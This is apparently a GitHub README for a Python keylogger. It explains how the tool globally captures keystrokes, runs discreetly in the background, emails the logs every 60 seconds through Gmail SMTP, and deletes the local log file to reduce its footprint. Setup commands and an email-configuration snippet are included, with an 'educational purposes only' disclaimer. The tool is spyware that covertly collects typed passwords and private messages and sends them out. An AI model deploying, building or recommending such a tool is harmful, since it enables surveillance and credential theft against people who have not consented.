# Keylogger

A simple yet effective keylogger written in Python. This tool is designed for educational purposes to demonstrate concepts in cybersecurity and Python programming. It captures keystrokes, logs them to a file, and periodically emails the logs to a specified address. The script operates discreetly in the background using threading.

## Features

-   **Keystroke Logging:** Captures all keyboard events and saves them with timestamps to a local file.
-   **Background Operation:** Runs as a background process using Python's `threading` module, allowing it to log keystrokes without an active terminal window.
-   **Automated Email Reports:** Periodically sends the captured logs as an email attachment using a secure SMTP connection with Gmail.
-   **Log Management:** Automatically deletes the log file after it has been successfully emailed to maintain cleanliness and reduce its on-disk footprint.

## How It Works

1.  **Listener:** The script uses the `keyboard` library to set up a global listener that captures every key press.
2.  **Logging:** Each key press event is timestamped and appended to a log file located at `C:\Users\Public\logfile.txt`.
3.  **Background Scheduler:** A separate thread is started that runs a scheduler function.
4.  **Emailing:** This scheduler function wakes up at a defined interval (every 60 seconds by default), reads the log file, attaches it to an email, and sends it to the configured recipient.
5.  **Cleanup:** After the email is sent successfully, the local log file is deleted.
6.  **Persistence:** The main thread uses `keyboard.wait()` to run indefinitely, ensuring the key listener remains active.

## Getting Started

Follow these instructions to get a copy of the project up and running on your local machine.

### Prerequisites

-   Python 3.x
-   pip (Python package installer)

### Installation

1.  Clone the repository to your local machine:
    ```sh
    git clone https://github.com/lakshya-004/Keylogger.git
    ```
2.  Navigate to the project directory:
    ```sh
    cd Keylogger
    ```
3.  Install the required Python package:
    ```sh
    pip install keyboard
    ```

## Usage

### Configuration

Before running the script, you must configure your email settings within `Main.py`.

1.  Open `Main.py` in a text editor.
2.  Locate the `schedule_email` function.
3.  Replace the placeholder values for `sender_email`, `app_password`, and `recipient_email`.

    ```python
    # Inside the schedule_email function
    send_email_with_attachment(
        sender_email="your_email@gmail.com",
        app_password="your_gmail_app_password",
        recipient_email="recipient_email@example.com",
        subject="Keylogger Log File",
        body="Attached is the keylogger log file.",
        file_path=log_file_path
    )
    ```

    > **Important:** For `app_password`, you must generate a **Google App Password** for your Gmail account. Your regular password will not work if you have 2-Factor Authentication enabled.

4.  **(Optional)** You can change the email sending interval by modifying the `time.sleep(60)` value (in seconds) within the `schedule_email` function.

### Running the Script

Execute the script from your terminal. Administrator privileges may be required for the keylogger to capture keystrokes system-wide.

```sh
python Main.py
```

The script will now run in the background. To stop it, you must terminate the process (e.g., press `Ctrl+C` in the terminal or end the process through your system's Task Manager).

## Disclaimer

This project is intended for **educational purposes only**. The misuse of this software is strongly discouraged. Using this keylogger on any computer without the owner's explicit permission is illegal and unethical. The author of this repository is not responsible for any damage or legal issues caused by the misuse of this tool. Use it responsibly and at your own risk.
